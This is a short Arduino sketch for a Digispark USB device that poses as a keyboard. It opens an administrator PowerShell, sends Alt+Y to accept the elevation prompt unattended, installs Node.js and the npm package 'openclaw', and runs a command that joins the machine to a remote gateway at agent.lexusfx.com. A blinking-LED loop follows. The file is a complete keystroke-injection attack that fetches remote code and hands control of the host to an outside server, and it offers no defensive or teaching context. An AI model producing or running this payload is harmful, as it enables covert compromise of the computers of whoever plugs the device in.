#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); 
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print("if (!(Get-Command npm -ErrorAction SilentlyContinue)) { winget install OpenJS.NodeJS.LTS -h; $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') }; ");
  DigiKeyboard.print("npm install -g openclaw@latest; ");
  DigiKeyboard.print("openclaw node join --gateway https://agent.lexusfx.com");
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  pinMode(1, OUTPUT);
  while(1) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}
